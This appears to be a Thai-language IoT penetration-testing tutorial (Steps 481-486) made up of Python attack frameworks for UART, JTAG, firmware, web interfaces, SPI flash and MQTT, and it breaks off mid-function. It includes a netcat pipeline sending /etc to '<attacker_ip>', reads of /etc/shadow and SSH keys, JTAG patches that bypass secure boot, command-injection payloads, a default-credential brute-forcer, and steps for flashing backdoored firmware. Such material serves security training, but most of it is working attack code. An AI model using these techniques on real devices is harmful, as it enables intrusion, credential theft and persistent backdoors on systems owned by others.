# Part 49: IoT Security Testing (Steps 481-490)

## ภาพรวม
การทดสอบความปลอดภัยของอุปกรณ์ IoT ครอบคลุม UART/JTAG, firmware extraction, web interface attacks และ hardware security

---

## Step 481: UART/Serial Port Exploitation

### อธิบาย
การค้นหาและใช้งาน UART (Universal Asynchronous Receiver-Transmitter) port บน IoT devices เพื่อเข้าถึง debug console

```python
#!/usr/bin/env python3
# UART/Serial Port Exploitation Framework

import serial
import time
import re
from typing import Optional

UART_COMMON_CONFIGS = [
    {'baud': 115200, 'data': 8, 'stop': 1, 'parity': 'N'},
    {'baud': 9600, 'data': 8, 'stop': 1, 'parity': 'N'},
    {'baud': 57600, 'data': 8, 'stop': 1, 'parity': 'N'},
    {'baud': 38400, 'data': 8, 'stop': 1, 'parity': 'N'},
    {'baud': 19200, 'data': 8, 'stop': 1, 'parity': 'N'},
]

# UART pin identification
UART_PIN_GUIDE = """
# ค้นหา UART pins บน PCB:
# 1. แยก power supply ออก (VCC=3.3V/5V, GND=0V)
# 2. TX คือ pin ที่มีสัญญาณอยู่ตลอดเวลาเมื่อ device boot
# 3. RX คือ pin ที่มีค่า voltage สูง (HIGH)
# 4. ใช้ multimeter/logic analyzer ยืนยัน
# 5. ต่อ TX device -> RX USB serial adapter
# 6. ต่อ RX device -> TX USB serial adapter
# 7. GND -> GND

# Hardware tools:
# - FTDI USB-to-UART adapter
# - USB-to-TTL (CH340, PL2303)
# - Bus Pirate
# - J-Link
"""

class UARTExploiter:
    """UART serial port exploitation tool"""
    
    def __init__(self, port: str = '/dev/ttyUSB0'):
        self.port = port
        self.serial_conn = None
    
    def identify_baud_rate(self) -> Optional[int]:
        """ค้นหา baud rate อัตโนมัติ"""
        print("[*] Auto-detecting baud rate...")
        print("[*] Power cycle the device while connected\n")
        
        for config in UART_COMMON_CONFIGS:
            baud = config['baud']
            print(f"[*] Trying {baud} baud...")
            
            try:
                ser = serial.Serial(
                    port=self.port,
                    baudrate=baud,
                    bytesize=config['data'],
                    stopbits=config['stop'],
                    parity=config['parity'],
                    timeout=2
                )
                
                data = ser.read(100)
                if data:
                    decoded = data.decode('utf-8', errors='ignore')
                    # ตรวจสอบว่า data อ่านได้
                    if len([c for c in decoded if c.isprintable()]) > len(decoded) * 0.7:
                        print(f"[+] Found baud rate: {baud}")
                        print(f"[+] Sample data: {decoded[:50]}")
                        ser.close()
                        return baud
                
                ser.close()
                
            except serial.SerialException as e:
                print(f"[-] Error at {baud}: {e}")
        
        print("[-] Could not auto-detect baud rate")
        return None
    
    def connect(self, baud_rate: int = 115200) -> bool:
        """เชื่อมต่อ UART"""
        try:
            self.serial_conn = serial.Serial(
                port=self.port,
                baudrate=baud_rate,
                bytesize=8,
                stopbits=1,
                parity='N',
                timeout=1
            )
            print(f"[+] Connected to {self.port} at {baud_rate} baud")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def read_boot_messages(self, timeout: int = 10) -> str:
        """อ่าน boot messages"""
        print(f"[*] Reading boot messages for {timeout} seconds...")
        print("[*] Power cycle the device NOW")
        
        output = []
        start_time = time.time()
        
        if not self.serial_conn:
            # จำลอง boot messages
            mock_boot = """
U-Boot 2021.10 (Oct 01 2021)
DRAM: 128 MiB
MMC: mmc@7e202000: 0
Loading Environment from FAT...
Starting kernel ...
[    0.000000] Linux version 5.10.17
[    0.000000] CPU: ARMv7
[    1.234567] Booting...

Welcome to OpenWrt!
--------------------------------------------------------------------------
BusyBox v1.33.1

login: """
            return mock_boot
        
        while time.time() - start_time < timeout:
            if self.serial_conn.in_waiting:
                data = self.serial_conn.read(self.serial_conn.in_waiting)
                decoded = data.decode('utf-8', errors='ignore')
                output.append(decoded)
                print(decoded, end='', flush=True)
        
        return ''.join(output)
    
    def interrupt_boot(self) -> bool:
        """หยุด boot sequence"""
        print("[*] Attempting to interrupt boot...")
        print("[*] Sending interrupt signals...")
        
        if not self.serial_conn:
            print("[*] Would send: Ctrl+C, Enter, Space during U-Boot countdown")
            return True
        
        # ส่ง interrupt signalsครั้งเดียว
        for char in [b'\x03', b'\n', b' ', b'\x03']:
            self.serial_conn.write(char)
            time.sleep(0.1)
        
        return True
    
    def uboot_commands(self):
        """คำสั่ง U-Boot เมื่อสามารถหยุด boot ได้"""
        uboot_cmds = """
# U-Boot useful commands:

# ดู environment variables
printenv

# ดู memory map
bdinfo

# Dump flash
flinfo

# Read/Write memory
md 0x80000000  # Memory display
mw 0x80000000 0x00  # Memory write

# Boot single user mode (bypass auth)
setenv bootargs "${bootargs} init=/bin/sh"
boot

# หรือบน Linux:
setenv bootargs "${bootargs} single"

# Dump full flash
nand dump 0 > /tmp/flash.bin

# TFTP boot (load custom kernel)
setenv serverip 192.168.1.100
setenv ipaddr 192.168.1.200
tftpboot 0x80000000 custom_kernel.bin
boot
"""
        print(uboot_cmds)
    
    def bypass_login(self, boot_output: str):
        """พยายาม bypass login"""
        print("\n[*] Attempting login bypass...")
        
        # ค้นหา default credentials จาก boot messages
        default_creds = [
            ('root', ''),
            ('root', 'root'),
            ('root', 'admin'),
            ('admin', 'admin'),
            ('root', '123456'),
            ('root', 'password'),
            ('admin', ''),
        ]
        
        # ค้นหา vendor/model จาก boot output
        if 'openwrt' in boot_output.lower():
            default_creds.insert(0, ('root', ''))
        elif 'ddwrt' in boot_output.lower():
            default_creds.insert(0, ('root', 'admin'))
        elif 'busybox' in boot_output.lower():
            default_creds.insert(0, ('root', ''))  
        
        print("[*] Default credentials to try:")
        for user, pwd in default_creds:
            print(f"  {user}:{pwd if pwd else '<empty>'}")
        
        return default_creds
    
    def extract_credentials_from_filesystem(self):
        """ดึง credentials จาก filesystem"""
        extract_cmds = """
# หลัง login สำเร็จ:

# ดู /etc/passwd
cat /etc/passwd
cat /etc/shadow

# หา SSH keys
find / -name 'authorized_keys' -o -name 'id_rsa' 2>/dev/null

# หา hardcoded credentials ใน config files
grep -r 'password\|passwd\|secret\|key' /etc/ 2>/dev/null

# หา WiFi passwords
cat /etc/wireless/*/wpa_supplicant.conf

# Extract to attacker
nc -l -p 4444 > /tmp/device_files.tar &
tar -cf - /etc/ | nc <attacker_ip> 4444
"""
        print(extract_cmds)

if __name__ == '__main__':
    exploiter = UARTExploiter('/dev/ttyUSB0')
    print(UART_PIN_GUIDE)
    
    baud = exploiter.identify_baud_rate()
    if baud:
        exploiter.connect(baud)
        boot_output = exploiter.read_boot_messages()
        exploiter.interrupt_boot()
        exploiter.uboot_commands()
        creds = exploiter.bypass_login(boot_output)
        exploiter.extract_credentials_from_filesystem()
```

---

## Step 482: JTAG/SWD Debug Interface Exploitation

### อธิบาย
การใช้งาน JTAG (Joint Test Action Group) และ SWD (Serial Wire Debug) เพื่อ debug และ dump firmware

```python
#!/usr/bin/env python3
# JTAG/SWD Debug Interface Exploitation

JTAG_SETUP = """
# JTAG Pins:
# TCK  - Test Clock
# TMS  - Test Mode Select
# TDI  - Test Data In
# TDO  - Test Data Out
# TRST - Test Reset (optional)
# GND  - Ground

# SWD Pins (simpler, 2-wire):
# SWCLK - Serial Wire Clock
# SWDIO - Serial Wire Data I/O
# GND   - Ground

# Hardware tools:
# - J-Link debug probe (best)
# - ST-Link v2 (for STM32)
# - Bus Pirate
# - FTDI FT232H
# - OpenOCD with generic probe

# Software:
apt-get install openocd gdb-multiarch -y
"""

class JTAGExploiter:
    """JTAG/SWD firmware extraction and debugging"""
    
    def identify_jtag_pins(self):
        """ค้นหา JTAG pins ด้วย JTAGulator"""
        identify_tools = """
# ใช้ JTAGulator (hardware tool) สำหรับ auto-detect JTAG pins
# เชื่อมต่อ JTAGulator ผ่าน USB
screen /dev/ttyUSB0 115200
# Enter 'B' for BYPASS mode scan
# Enter 'U' for UART scan

# หรือใช้ OpenOCD และ probe manually
# 1. ต่อ probe ไปยัง suspected pins
# 2. ใช้ multimeter วัดค่าประมาณ
# 3. TCK: square wave pattern
# 4. TMS: transitions during JTAG state machine

# UrJTAG cable detection
jtag
  cable jlink
  detect
  print chain
"""
        print(identify_tools)
    
    def openocd_config(self, target_chip: str = 'arm'):
        """สร้าง OpenOCD configuration"""
        openocd_configs = {
            'arm_generic': """
# openocd_arm.cfg
source [find interface/jlink.cfg]
source [find target/swj-dp.tcl]

transport select jtag

set _CHIPNAME arm
set _ENDIAN little
set _CPUTAPID 0x4ba00477

swj_newdap $_CHIPNAME cpu -irlen 4 -expected-id $_CPUTAPID
target create $_CHIPNAME.cpu cortex_a -endian $_ENDIAN -dap [dap create $_CHIPNAME.dap]

reset_config trst_and_srst
""",
            'stm32': """
# openocd_stm32.cfg
source [find interface/stlink.cfg]
source [find target/stm32f1x.cfg]
""",
            'raspberry_pi': """
# openocd_rpi.cfg
source [find interface/raspberrypi-native.cfg]
transport select swd

source [find target/bcm2835.cfg]
"""
        }
        
        config = openocd_configs.get(target_chip, openocd_configs['arm_generic'])
        print(f"[*] OpenOCD config for {target_chip}:")
        print(config)
        return config
    
    def dump_firmware_via_jtag(self, base_addr: int = 0x0, size: int = 0x200000):
        """Dump firmware ผ่าน JTAG"""
        dump_script = f"""
# เชื่อมต่อ OpenOCD
openocd -f openocd.cfg &

# ต่อด้วย telnet
telnet localhost 4444

# ใน OpenOCD shell:
halt                           # หยุด CPU
register                       # ดู register values
flash list                     # ดู flash regions

# Dump firmware
dump_image /tmp/firmware.bin {hex(base_addr)} {hex(size)}

# Resume execution
resume

# หรือใช้ GDB
gdb-multiarch
target extended-remote localhost:3333
monitor halt
dump binary memory /tmp/firmware.bin {hex(base_addr)} {hex(base_addr + size)}
"""
        print(dump_script)
    
    def bypass_secure_boot(self):
        """Bypass secure boot via JTAG"""
        bypass_methods = """
# Method 1: Debug port backdoor
# หลายครั้ง debug interface ยัง active แม้ใน production

# Method 2: Fault injection via JTAG
# ใช้ JTAG เปลี่ยน register values เพื่อ bypass security checks

# OpenOCD: เปลี่ยน return value ของ verification function
halt
# หา address ของ verify_signature()
break *0x80001234
continue
# เมื่อ breakpoint hit:
set $r0 = 0   # force return value = success
continue

# Method 3: Memory patch
# เขียน NOP ทับ signature check
mwrite 0x80001234 0xe3a00000  # MOV R0, #0 (return 0 = success)
"""
        print(bypass_methods)
    
    def read_device_memory(self, addr: int, length: int = 256):
        """Read device memory via JTAG"""
        read_cmd = f"""
# อ่าน memory ผ่าน OpenOCD
telnet localhost 4444
# mdw = memory display word (32-bit)
mdw {hex(addr)} {length // 4}

# mdb = memory display byte
mdb {hex(addr)} {length}

# GDB read memory
x/{length}x {hex(addr)}

# หา hardcoded credentials ใน memory
x/100s {hex(addr)}  # อ่าน strings
"""
        print(read_cmd)
    
    def chip_id_detection(self):
        """Detect chip via JTAG IDCODE"""
        detection = """
# JTAG IDCODE scan
# แต่ละ chip มี unique IDCODE 32-bit

# OpenOCD
openocd -f interface/jlink.cfg -c 'transport select jtag; jtag newtap auto cpu -irlen 5; init; jtag arp_init-reset; scan_chain; shutdown'

# URJtag
jtag
  cable jlink
  detect
  # Output: Detected IR length: 4
  # IDCODE: 0x4ba00477 = ARM Cortex-A9

# Common IDCODEs:
# 0x4ba00477 = ARM Cortex-A
# 0x2ba01477 = ARM Cortex-M3
# 0x4ba02477 = ARM Cortex-A5
# 0x1b85203f = Qualcomm APQ8064
"""
        print(detection)

if __name__ == '__main__':
    exploiter = JTAGExploiter()
    print(JTAG_SETUP)
    exploiter.identify_jtag_pins()
    exploiter.openocd_config('stm32')
    exploiter.dump_firmware_via_jtag(base_addr=0x08000000, size=0x100000)
    exploiter.bypass_secure_boot()
    exploiter.chip_id_detection()
```

---

## Step 483: Firmware Extraction and Analysis

### อธิบาย
การดึงและวิเคราะห์ firmware ของ IoT device

```python
#!/usr/bin/env python3
# Firmware Extraction and Analysis Framework

import subprocess
import os
import hashlib
from pathlib import Path

FIRMWARE_ANALYSIS_TOOLS = {
    'binwalk': 'สกัด firmware และ extract embedded files',
    'firmwalker': 'ค้นหา sensitive files ใน firmware',
    'strings': 'ดึง printable strings จาก binary',
    'file': 'ระบุ file type',
    'hexdump': 'ดู hex content',
    'ghidra': 'Reverse engineering และ disassembly',
    'objdump': 'เปิด ELF binary analysis',
    'readelf': 'วิเคราะห์ ELF headers'
}

class FirmwareAnalyzer:
    """Firmware extraction and security analysis"""
    
    def __init__(self, firmware_path: str):
        self.firmware_path = firmware_path
        self.extract_dir = '/tmp/firmware_extracted'
        self.findings = []
    
    def initial_analysis(self):
        """Initial firmware analysis"""
        print(f"[*] Analyzing: {self.firmware_path}")
        
        commands = f"""
# File identification
file {self.firmware_path}

# คำนวณ hash
md5sum {self.firmware_path}
sha256sum {self.firmware_path}

# Entropy analysis
binwalk -E {self.firmware_path}
# High entropy (>7.5) = compressed/encrypted
# Low entropy = plaintext data

# Strings
strings {self.firmware_path} | head -50

# Hex dump
hexdump -C {self.firmware_path} | head -30
"""
        print(commands)
    
    def extract_with_binwalk(self):
        """Extract firmware contents with binwalk"""
        extract_cmds = f"""
# ติดตั้ง binwalk
pip3 install binwalk
apt-get install binwalk -y

# Basic extraction
binwalk -e {self.firmware_path}

# Recursive extraction
binwalk -Me {self.firmware_path}

# Output ไปยังฟอลเดอร์ที่ custom
binwalk -e -C {self.extract_dir} {self.firmware_path}

# ดู extracted files
ls -la {self.extract_dir}/
find {self.extract_dir} -type f | head -50
"""
        print(extract_cmds)
    
    def analyze_filesystem(self):
        """Analyze extracted filesystem"""
        print("\n[*] Analyzing extracted filesystem...")
        
        fs_analysis = f"""
# ค้นหา filesystem type
file {self.extract_dir}/**/*

# Mount squashfs
mount -t squashfs {self.extract_dir}/squashfs.bin /mnt/firmware_fs -o loop

# หรือใช้ binwalk
binwalk -e squashfs.bin  # auto-extract

# หลัง mount:
find /mnt/firmware_fs/ -type f | head -100
"""
        print(fs_analysis)
    
    def find_sensitive_data(self):
        """Find sensitive data in firmware"""
        print("\n[*] Searching for sensitive data...")
        
        search_patterns = [
            ('Passwords', 'password|passwd|passphrase'),
            ('Credentials', 'username|login|credential'),
            ('Keys', 'private_key|secret_key|api_key'),
            ('Hardcoded IPs', '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'),
            ('URLs', 'http://|https://|ftp://'),
            ('SSH Keys', '-----BEGIN.*PRIVATE KEY-----'),
            ('Certificates', '-----BEGIN CERTIFICATE-----'),
        ]
        
        sensitive_search = f"""
# ใช้ firmwalker
git clone https://github.com/craigz28/firmwalker
./firmwalker.sh {self.extract_dir} /tmp/firmware_report.txt

# หรือ manual search
# หา password files
find {self.extract_dir} -name 'passwd' -o -name 'shadow' -o -name '.htpasswd' 2>/dev/null

# หา SSH keys
find {self.extract_dir} -name '*.pem' -o -name '*.key' -o -name 'authorized_keys' 2>/dev/null

# หา hardcoded credentials
grep -r -i 'password' {self.extract_dir}/etc/ 2>/dev/null | head -20
grep -r -i 'secret' {self.extract_dir}/etc/ 2>/dev/null | head -20

# หา API keys/tokens
grep -r -E '[a-zA-Z0-9]{{32,}}' {self.extract_dir}/etc/ 2>/dev/null | head -20

# หา hardcoded IPs
grep -r -E '([0-9]{{1,3}}\.){3}[0-9]{{1,3}}' {self.extract_dir}/etc/ 2>/dev/null
"""
        print(sensitive_search)
    
    def analyze_binary(self, binary_path: str):
        """Analyze specific binary"""
        print(f"\n[*] Analyzing binary: {binary_path}")
        
        binary_analysis = f"""
# Basic info
file {binary_path}
readelf -h {binary_path}  # ELF header
readelf -S {binary_path}  # Sections

# Security features check
checksec --file={binary_path}
# Checks: RELRO, Stack Canary, NX, PIE, ASLR

# Strings
strings {binary_path} | grep -i 'password\\|key\\|secret\\|admin'

# Dynamic analysis
strace ./{binary_path}
ltrace ./{binary_path}

# Ghidra (GUI)
ghidraRun
# File -> Import -> select binary
# Analyze -> Auto Analyze

# Radare2
r2 {binary_path}
aaa   # analyze
afl   # list functions
pdf @ main  # disassemble main
"""
        print(binary_analysis)
    
    def emulate_firmware(self):
        """Emulate firmware with QEMU"""
        print("\n[*] Firmware emulation with QEMU")
        
        emulation_cmds = f"""
# ติดตั้ง QEMU
apt-get install qemu qemu-user qemu-user-static qemu-system-arm -y

# ตรวจสอบ architecture
file {self.extract_dir}/bin/busybox
# Output: ELF 32-bit LSB executable, ARM

# เลียนแบบสำหรับ MIPS (router)
apt-get install qemu-user-static binutils-mips-linux-gnu

# User-mode emulation
cp /usr/bin/qemu-arm-static {self.extract_dir}/usr/bin/
chroot {self.extract_dir}/ /usr/bin/qemu-arm-static /bin/sh

# Full system emulation (more complex)
qemu-system-arm \\
    -M virt \\
    -kernel extracted_kernel \\
    -initrd extracted_initrd \\
    -append 'console=ttyAMA0' \\
    -nographic

# หรือใช้ FirmAE
git clone https://github.com/pr0v3rbs/FirmAE
cd FirmAE && ./run.sh -r brand firmware.bin
"""
        print(emulation_cmds)
    
    def dynamic_analysis_setup(self):
        """Setup dynamic analysis environment"""
        dynamic_setup = f"""
# Debug mode setup
chroot {self.extract_dir}/ /usr/bin/qemu-arm-static /sbin/httpd &

# Port forwarding (if needed)
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80 &

# Intercept web interface
curl http://localhost:8080/

# อ่าน web interface traffic
mitmproxy --mode regular
curl --proxy http://localhost:8080 http://192.168.1.1/
"""
        print(dynamic_setup)

if __name__ == '__main__':
    analyzer = FirmwareAnalyzer('/tmp/device_firmware.bin')
    analyzer.initial_analysis()
    analyzer.extract_with_binwalk()
    analyzer.analyze_filesystem()
    analyzer.find_sensitive_data()
    analyzer.emulate_firmware()
```

---

## Step 484: IoT Web Interface Security Testing

### อธิบาย
การทดสอบความปลอดภัยที่ web interface ของ IoT devices

```python
#!/usr/bin/env python3
# IoT Web Interface Security Testing

import requests
import json
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin

IOT_DEFAULT_CREDENTIALS = [
    ('admin', 'admin'), ('admin', ''), ('admin', 'password'),
    ('admin', '1234'), ('root', 'root'), ('root', ''),
    ('guest', 'guest'), ('user', 'user'), ('admin', 'admin123'),
    ('support', 'support'), ('service', 'service'),
]

COMMON_IOT_PATHS = [
    '/admin', '/manage', '/cgi-bin/', '/goform/',
    '/api/v1/', '/api/', '/rest/', '/config',
    '/backup', '/debug', '/test', '/status',
    '/firmware', '/upgrade', '/ping', '/exec',
    '/.env', '/info.php', '/phpinfo.php',
]

class IoTWebTester:
    """IoT web interface security testing"""
    
    def __init__(self, target_url: str):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.findings = []
    
    def fingerprint_device(self) -> dict:
        """Fingerprint IoT device"""
        print(f"[*] Fingerprinting: {self.target}")
        
        info = {}
        
        try:
            resp = self.session.get(self.target, timeout=10)
            
            # หา server header
            info['server'] = resp.headers.get('Server', 'Unknown')
            info['x_powered_by'] = resp.headers.get('X-Powered-By', '')
            info['title'] = ''
            
            # Parse title
            soup = BeautifulSoup(resp.text, 'html.parser')
            if soup.title:
                info['title'] = soup.title.string
            
            # Identify common routers/devices
            for device in ['TP-Link', 'Netgear', 'Linksys', 'ASUS', 'D-Link', 
                          'Mikrotik', 'Ubiquiti', 'Hikvision', 'Dahua']:
                if device.lower() in resp.text.lower():
                    info['device_type'] = device
                    break
            
            print(f"[+] Server: {info['server']}")
            print(f"[+] Title: {info['title']}")
            print(f"[+] Device: {info.get('device_type', 'Unknown')}")
            
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return info
    
    def test_default_credentials(self) -> dict:
        """Test default credentials"""
        print("\n[*] Testing default credentials...")
        
        login_paths = ['/login', '/auth', '/admin/login', '/cgi-bin/login.cgi',
                       '/admin.html', '/login.html', '/login.asp']
        
        for user, password in IOT_DEFAULT_CREDENTIALS:
            for path in login_paths:
                url = f"{self.target}{path}"
                
                try:
                    # Form-based auth
                    resp = self.session.post(
                        url,
                        data={'username': user, 'password': password,
                              'user': user, 'pass': password},
                        timeout=5,
                        allow_redirects=True
                    )
                    
                    # Basic auth
                    resp_basic = self.session.get(
                        url,
                        auth=(user, password),
                        timeout=5
                    )
                    
                    # ตรวจสอบความสำเร็จ
                    for r in [resp, resp_basic]:
                        if r.status_code == 200 and any(
                            word in r.text.lower() 
                            for word in ['dashboard', 'logout', 'welcome', 'admin panel']
                        ):
                            print(f"[+] FOUND: {user}:{password} at {url}")
                            return {'username': user, 'password': password, 'url': url}
                
                except:
                    pass
        
        print("[-] No default credentials worked")
        return {}
    
    def scan_hidden_endpoints(self) -> list:
        """Scan hidden/undocumented endpoints"""
        print("\n[*] Scanning hidden endpoints...")
        found = []
        
        all_paths = COMMON_IOT_PATHS.copy()
        
        # ได้ paths จาก SecLists
        iot_wordlist = """
# ใช้ gobuster สำหรับ directory scanning
gobuster dir \\
    -u {self.target} \\
    -w /usr/share/SecLists/Discovery/Web-Content/iot-default-credentials.txt \\
    -w /usr/share/SecLists/Discovery/Web-Content/cgi.txt \\
    -o /tmp/iot_endpoints.txt
"""
        print(iot_wordlist)
        
        for path in all_paths:
            try:
                url = f"{self.target}{path}"
                resp = self.session.get(url, timeout=5)
                if resp.status_code not in [404, 403]:
                    found.append({'path': path, 'status': resp.status_code, 'size': len(resp.content)})
                    print(f"[+] Found: {path} ({resp.status_code})")
            except:
                pass
        
        return found
    
    def test_command_injection(self) -> list:
        """Test for command injection via CGI/forms"""
        print("\n[*] Testing command injection...")
        findings = []
        
        injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '`id`',
            '$(id)',
            '; id; echo done',
            '& ping -c 1 127.0.0.1 &',
            "'; id; echo '",
        ]
        
        # Common IoT CGI endpoints
        cgi_endpoints = [
            '/cgi-bin/ping.cgi?host=',
            '/cgi-bin/traceroute.cgi?host=',
            '/cgi-bin/nslookup.cgi?host=',
            '/goform/ping?host=',
            '/api/v1/ping?target=',
        ]
        
        for endpoint in cgi_endpoints:
            for payload in injection_payloads:
                try:
                    url = f"{self.target}{endpoint}{requests.utils.quote(payload)}"
                    resp = self.session.get(url, timeout=10)
                    
                    # หา command injection indicators
                    if any(indicator in resp.text for indicator in 
                           ['root:', 'uid=', 'bash', '/bin/', 'passwd']):
                        finding = {
                            'type': 'Command Injection',
                            'url': url,
                            'payload': payload,
                            'evidence': resp.text[:200]
                        }
                        findings.append(finding)
                        print(f"[!] COMMAND INJECTION: {endpoint} with {payload}")
                
                except:
                    pass
        
        return findings
    
    def test_authentication_bypass(self) -> list:
        """Test authentication bypass"""
        print("\n[*] Testing authentication bypass...")
        bypass_findings = []
        
        bypass_payloads = [
            # URL manipulation
            '/admin?auth=1',
            '/admin?bypass=true',
            '/cgi-bin/admin.cgi?authenticated=1',
            # Direct access
            '/backup.tar.gz',
            '/config.bin',
            '/etc/passwd',
            '/debug.log',
        ]
        
        for path in bypass_payloads:
            try:
                url = f"{self.target}{path}"
                resp = self.session.get(url, timeout=5)
                
                if resp.status_code == 200 and len(resp.content) > 50:
                    bypass_findings.append({
                        'path': path,
                        'status': resp.status_code,
                        'size': len(resp.content)
                    })
                    print(f"[!] AUTH BYPASS: {path} ({resp.status_code}, {len(resp.content)} bytes)")
            except:
                pass
        
        return bypass_findings
    
    def extract_config_backup(self):
        """Attempt to download configuration backup"""
        print("\n[*] Attempting config backup extraction...")
        
        backup_paths = [
            '/backup.tar.gz', '/config.tar.gz', '/config.bin',
            '/cgi-bin/backup.cgi', '/admin/backup',
            '/api/v1/backup', '/export/config',
        ]
        
        for path in backup_paths:
            try:
                url = f"{self.target}{path}"
                resp = self.session.get(url, timeout=10)
                
                if resp.status_code == 200 and len(resp.content) > 100:
                    filename = f"/tmp/iot_backup_{path.replace('/', '_')}"
                    with open(filename, 'wb') as f:
                        f.write(resp.content)
                    print(f"[+] Downloaded config from: {path} -> {filename}")
            except:
                pass

if __name__ == '__main__':
    tester = IoTWebTester('http://192.168.1.1')
    
    info = tester.fingerprint_device()
    creds = tester.test_default_credentials()
    endpoints = tester.scan_hidden_endpoints()
    cmd_findings = tester.test_command_injection()
    auth_bypass = tester.test_authentication_bypass()
    tester.extract_config_backup()
```

---

## Step 485: SPI Flash Memory Extraction

### อธิบาย
การดึงข้อมูลจาก SPI flash memory chip โดยตรง

```python
#!/usr/bin/env python3
# SPI Flash Memory Extraction

SPI_SETUP = """
# SPI Flash Chip Pins (SOIC-8 package):
# Pin 1: CS (Chip Select) - Active LOW
# Pin 2: SO/MISO (Master In Slave Out)
# Pin 3: WP (Write Protect) - tie to VCC to disable
# Pin 4: GND
# Pin 5: SI/MOSI (Master Out Slave In)
# Pin 6: CLK (Clock)
# Pin 7: HOLD - tie to VCC
# Pin 8: VCC (3.3V typical)

# Hardware:
# - Raspberry Pi (GPIO SPI)
# - Bus Pirate + flashrom
# - CH341A USB programmer
# - Pomona 5250 test clip (in-circuit reading)

# Identify chip (package marking)
# Common: W25Q32, W25Q64, W25Q128 (Winbond)
# MX25L6405D (Macronix), SST25VF series (Microchip)
"""

class SPIFlashExtractor:
    """SPI flash memory extraction tool"""
    
    def setup_ch341a(self):
        """ตั้งค่า CH341A USB programmer"""
        setup_cmds = """
# ติดตั้ง flashrom
apt-get install flashrom -y

# ตรวจสอบ device
flashrom --programmer ch341a_spi

# Output: Found Winbond flash chip "W25Q64.V" (8192 kB, SPI)
"""
        print(setup_cmds)
    
    def read_spi_flash(self, programmer: str = 'ch341a_spi', output_file: str = '/tmp/flash.bin'):
        """Read SPI flash chip"""
        read_cmds = f"""
# อ่านข้อมูลจาก flash chip
flashrom \\
    --programmer {programmer} \\
    -r {output_file}

# Read 2 times เพื่อ verify
flashrom \\
    --programmer {programmer} \\
    -r {output_file}_2

# เปรียบเทียบ
md5sum {output_file} {output_file}_2
# ต้องหเพื่อยันยันว่า consistent
"""
        print(read_cmds)
    
    def read_via_raspberry_pi(self, output_file: str = '/tmp/flash.bin'):
        """Read SPI flash via Raspberry Pi GPIO"""
        rpi_cmds = f"""
# Raspberry Pi SPI connections:
# Pi MOSI (Pin 19) -> Flash SI (Pin 5)
# Pi MISO (Pin 21) -> Flash SO (Pin 2)
# Pi CLK  (Pin 23) -> Flash CLK (Pin 6)
# Pi CE0  (Pin 24) -> Flash CS  (Pin 1)
# Pi 3.3V (Pin 17) -> Flash VCC (Pin 8), WP (Pin 3), HOLD (Pin 7)
# Pi GND  (Pin 25) -> Flash GND (Pin 4)

# เปิด SPI module
modprobe spi-bcm2835

# อ่านด้วย flashrom
flashrom \\
    --programmer linux_spi:dev=/dev/spidev0.0,spispeed=4000 \\
    -r {output_file}

# หรือใช้ Python spidev
pip3 install spidev
"""
        print(rpi_cmds)
    
    def read_via_bus_pirate(self, output_file: str = '/tmp/flash.bin'):
        """Read via Bus Pirate"""
        bp_cmds = f"""
# Bus Pirate connection:
flashrom \\
    --programmer buspirate_spi:dev=/dev/ttyUSB0,spispeed=125k \\
    -r {output_file}

# Identify chip first
flashrom \\
    --programmer buspirate_spi:dev=/dev/ttyUSB0,spispeed=125k \\
    --identify
"""
        print(bp_cmds)
    
    def analyze_dump(self, dump_file: str):
        """Analyze the extracted flash dump"""
        analysis = f"""
# วิเคราะห์ flash dump
file {dump_file}
hexdump -C {dump_file} | head -30

# Extract ด้วย binwalk
binwalk -Me {dump_file}

# หา strings
strings {dump_file} | grep -E 'pass|key|secret|admin|root' | head -30

# หา private keys
strings {dump_file} | grep 'BEGIN'

# หา network configuration
strings {dump_file} | grep -E '([0-9]{{1,3}}\.){3}[0-9]{{1,3}}'
"""
        print(analysis)
    
    def write_custom_firmware(self, firmware_file: str, programmer: str = 'ch341a_spi'):
        """Write custom firmware (for exploitation)"""
        write_cmd = f"""
# CAUTION: จะเขียนทับ firmware
# Backup ก่อน เสมอ!

# Write firmware
flashrom \\
    --programmer {programmer} \\
    -w {firmware_file}

# Verify write
flashrom \\
    --programmer {programmer} \\
    -v {firmware_file}

# เช่น เขียน custom firmware ที่มี backdoor:
# 1. Extract original firmware
# 2. Mount filesystem
# 3. เพิ่ม backdoor (/etc/init.d/backdoor.sh)
# 4. Repack squashfs
# 5. Write back to chip
"""
        print(write_cmd)

if __name__ == '__main__':
    extractor = SPIFlashExtractor()
    print(SPI_SETUP)
    extractor.setup_ch341a()
    extractor.read_spi_flash(output_file='/tmp/device_flash.bin')
    extractor.analyze_dump('/tmp/device_flash.bin')
```

---

## Step 486: MQTT Protocol Security Testing

### อธิบาย
การทดสอบความปลอดภัยของ MQTT (Message Queuing Telemetry Transport) หนึ่งใน protocols หลักของ IoT

```python
#!/usr/bin/env python3
# MQTT Security Testing Framework

import paho.mqtt.client as mqtt
import ssl
import json
import time
from threading import Thread

MQTT_VULNERABILITIES = [
    'Unauthenticated access (no username/password)',
    'Clear-text communication (no TLS)',
    'Topic ACL misconfigurations',
    'Wildcard subscription disclosure (#, +)',
    'Message persistence reveals historical data',
    'Retained messages with sensitive data',
    'DoS via excessive connections/messages'
]

COMMON_SENSITIVE_TOPICS = [
    '#',                        # All topics
    '$SYS/#',                   # Broker system info
    'home/#',                   # Home automation
    'device/#',                 # Device data
    'sensor/#',                 # Sensor data
    'command/#',                # Commands
    'control/#',                # Controls
    'status/#',                 # Status updates
    'alarm/#',                  # Alarm systems
    'camera/#',                 # Camera data
]

class MQTTSecurityTester:
    """MQTT protocol security assessment"""
    
    def __init__(self, broker_host: str, broker_port: int = 1883):
        self.broker = broker_host
        self.port = broker_port
        self.messages_captured = []
        self.client = None
    
    def test_anonymous_access(self) -> bool:
        """ทดสอบ anonymous access"""
        print(f"[*] Testing anonymous access to {self.broker}:{self.port}")
        
        try:
            client = mqtt.Client()
            client.connect(self.broker, self.port, 60)
            client.disconnect()
            print(f"[+] VULNERABLE: Anonymous access allowed!")
            return True
        except Exception as e:
            print(f"[-] Auth required: {e}")
            return False
    
    def test_authentication(self, credentials: list) -> dict:
        """ทดสอบ credentials list"""
